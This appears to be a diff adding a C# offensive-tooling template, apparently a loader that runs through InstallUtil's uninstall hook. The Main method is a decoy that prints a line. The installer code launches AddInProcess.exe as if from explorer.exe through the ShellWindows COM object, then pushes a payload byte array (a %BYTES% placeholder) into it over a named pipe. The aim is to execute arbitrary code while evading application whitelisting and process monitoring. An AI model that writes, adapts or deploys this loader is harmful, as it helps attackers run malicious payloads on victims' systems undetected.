@@ -1,0 +1,89 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.IO.Pipes;
+using System.Diagnostics;
+
+
+public class Program
+{
+    static void Main(string[] args)
+    {
+        Console.WriteLine("What are you looking at?");
+    }
+}
+
+[System.ComponentModel.RunInstaller(true)]
+public class Sample : System.Configuration.Install.Installer
+{
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+        int pid = GetExplorerProcessId();
+
+        LaunchAddin(pid);
+
+        int ct = 0;
+        while (ct < 10000000)
+        {
+            ct++;
+        }
+
+        SendData();
+    }
+
+    static int GetExplorerProcessId()
+    {
+        Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+
+        if (explorerProcesses.Length > 0)
+        {
+            return explorerProcesses[0].Id;
+        }
+
+        return -1;
+    }
+
+    static void LaunchAddin(int exppid)
+    {
+        Type shellWindowsType = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"));
+        dynamic shellWindows = Activator.CreateInstance(shellWindowsType);
+
+        string executable = "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\AddInProcess.exe";
+        string arguments = "/guid:32a91b0f-30cd-4c75-be79-ccbd6345de99 /pid:" + exppid;
+        string workingDirectory = "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319";
+
+        shellWindows.Item().Document.Application.ShellExecute(executable, arguments, workingDirectory, null, 0);
+
+        Console.WriteLine("Executed the program.");
+    }
+
+    public static void SendData()
+    {
+        int[] rawData = new int[]
+        {
+            %BYTES%
+        };
+
+        string pipeName = "32a91b0f-30cd-4c75-be79-ccbd6345de99";
+
+        try
+        {
+            using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.Out))
+            {
+                pipeClient.Connect();
+                using (StreamWriter writer = new StreamWriter(pipeClient, Encoding.Default, rawData.Length))
+                {
+                    foreach (int data in rawData)
+                    {
+                        writer.Write((char)data);
+                    }
+                    writer.Flush();
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(e.Message);
+        }
+    }
+}
